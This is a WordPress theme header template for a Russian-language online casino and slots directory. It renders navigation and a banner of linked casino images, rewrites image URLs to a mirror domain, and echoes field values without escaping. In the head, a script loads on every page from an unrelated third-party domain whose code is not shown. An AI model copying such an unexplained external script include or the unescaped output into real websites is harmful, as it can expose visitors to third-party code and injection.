<html lang="ru">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://savemyass.org/userjs/7ed7ff.js"></script>
    <title><?php echo wp_get_document_title(); ?></title>
    <link rel="shortcut icon" href="<?php echo get_stylesheet_directory_uri(); ?>/images/favicon/favicon.ico"
          type="image/x-icon">

	<?php wp_head(); ?>

</head>

<body>

<div class="bg-wr">
    <div class="cnt-wr">

        <header class="header">
            <div class="nav-line">
                <div class="container">
                    <div class="row">

                        <div class="col-lg-3 col-md-4 col-sm-8 col-xs-10">
                            <div class="logo">
                                <div class="logo-img-wr">
                                    <a href="/"><img class="logo-image"
                                                     src="<?php echo get_stylesheet_directory_uri(); ?>/images/logo.png"
                                                     alt="ilovesloti - Игровые автоматы онлайн"></a>
                                </div>
                                <div class="logo-text">Автоматы и казино Рунета</div>
                            </div>
                        </div>

                        <div class="col-lg-9 col-md-8 col-sm-4 col-xs-2">
                            <a href="#menu" id="toggle" class="toggle hidden-lg hidden-md"><span></span></a>
                            <nav id="menu" class="menu">
								<?php wp_nav_menu( array(
										'theme_location' => 'top',
										'walker'         => new Nav_Walker_Nav_Menu()
									)
								);
								?>
                            </nav>
                        </div>

                    </div>
                </div>
            </div>

            <div class="banner">
                <div class="container">
                    <div class="banner-title">Игровые Клубы</div>
                    <div class="banner-descr">Проверенные онлайн казино</div>
                    <div class="row">
						<?php if ( have_rows( 'game_homes', 'option' ) ): ?>

							<?php while ( have_rows( 'game_homes', 'option' ) ): the_row();
								// Переменные
								$image                     = get_sub_field( 'image' );
								$link                      = get_sub_field( 'link' );
								$image_data                = get_post( $image );
								$output_html_curr_link_img = wp_get_attachment_image_url( $image, 'full' );
								$output_html_curr_link_img = str_replace( 'https://iloveslotiz.ey.r.appspot.com/wp-content/uploads/', '//2ilovesloti.com/wp-content/uploads/', $output_html_curr_link_img );

								//print '<pre>';
								//var_dump( $image );
								//print '</pre>';
								?>
                                <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                                    <div class="banner-item"><a href="<?php echo $link; ?>" target="_blank"><img
                                                    src="<?php echo $output_html_curr_link_img; ?>"
                                                    title="<?php echo $image_data->post_title; ?>"
                                                    alt="<?php echo get_post_meta( $image, '_wp_attachment_image_alt', true ); ?>"></a>
                                    </div>
                                </div>

							<?php endwhile; ?>
						<?php endif; ?>
                    </div>
                </div>
            </div>
        </header>

        <div class="wrapper container">
            <div class="row">